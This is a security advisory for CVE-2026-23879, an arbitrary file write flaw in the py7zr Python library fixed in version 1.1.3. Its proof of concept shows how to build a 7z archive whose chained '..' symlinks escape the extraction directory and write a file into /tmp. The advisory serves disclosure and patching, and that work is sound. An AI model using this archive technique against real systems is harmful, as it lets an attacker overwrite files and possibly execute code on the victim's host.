# [H] py7zr: Arbitrary File Write Vulnerability

## Summary
Severity: High
Advisory: GHSA-q6rc-2cgv-63h7
CVE: CVE-2026-23879
CWE: CWE-59
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-q6rc-2cgv-63h7
Type: github-advisory

## Affected
- PyPI: `py7zr` — affected >=0 <1.1.3

## Details
### Summary
There exists an **arbitrary file write vulnerability** in `py7zr` (1.1.0, latest), which allows symbolic links to be recreated outside the destination directory via crafted malicious symbolic link chains. When using `extractall` to extract an archive, the library restores these symbolic links, linking them to arbitrary directories on the host file system. Subsequent extraction of regular files through these symbolic links can result in arbitrary file writes. This vulnerability may lead to remote code execution, privilege escalation, data corruption, or denial of service.

### Details
The root cause of this vulnerability is that `py7zr` fails to properly restrict the targets of symbolic links within an archive. During extraction, the program only checks the link arcname within the destination directory, but ignores the combined symlink path resolution. Attackers can exploit this vulnerability by constructing malicious archives, thereby bypassing the directory boundary restrictions implemented by the extractor.

<img width="1806" height="834" alt="image" src="https://github.com/user-attachments/assets/cdd27ddb-ba79-4b20-b8b9-21f3e16a6e8b" />


### PoC
#### **Construct PoC Archive File**
The following pseudo-code illustrates the vulnerable logic.

```python
def create_sevenz_exp(output_dir: str):
    filename = "archive.7z"
    file_path = output_dir + filename
    with py7zr.SevenZipFile(file_path, 'w') as archive:
        archive.writestr("Some Text", "dir0/someFile.txt")
        add_symlink(archive, "dir1", "dir0/..")
        add_symlink(archive, "dir2", "dir1/..")
        add_symlink(archive, "dir3", "dir2/..")
        add_symlink(archive, "dir4", "dir3/..")
        add_symlink(archive, "dir5", "dir4/..")
        add_symlink(archive, "dir6", "dir5/..")
        add_symlink(archive, "dir7", "dir6/..")
        add_symlink(archive, "dir8", "dir7/..")
        add_symlink(archive, "myTmp", "dir8/tmp")
        archive.writestr("Malicious Text\n", "myTmp/poc.txt")
```

#### **Unpack the archive**

Use common decompression methods, then extract the archive.

```python
import sys
import os
import py7zr

def extract_7z(seven_path, output_dir):
    os.makedirs(output_dir, exist_ok=True)
    with py7zr.SevenZipFile(seven_path, mode='r') as z:
        z.extractall(path=output_dir)
    print(f"Extracted '{seven_path}' to '{output_dir}'")

if __name__ == "__main__":
    seven_file = sys.argv[1]
    base_name = os.path.splitext(os.path.basename(seven_file))[0]
    output = base_name + "_sevenz_output"

    extract_7z(seven_file, output)
```

### Impact
<img width="1268" height="572" alt="image" src="https://github.com/user-attachments/assets/919b5ff6-97ba-4781-b3e4-e9c9cc0f229b" />

After decompression, the `output` directory contains a sequence of symbolic links, which can finally point to the system root directory. Then, when extracting a regular file, the file will be written to an arbitrary path.

## References
- https://github.com/miurahr/py7zr/security/advisories/GHSA-q6rc-2cgv-63h7
- https://nvd.nist.gov/vuln/detail/CVE-2026-23879
- https://github.com/advisories/GHSA-q6rc-2cgv-63h7
- https://github.com/miurahr/py7zr
- https://github.com/miurahr/py7zr/releases/tag/v1.1.3
- https://github.com/pypa/advisory-database/tree/main/vulns/py7zr/PYSEC-2026-2974.yaml
- https://pypi.org/project/py7zr
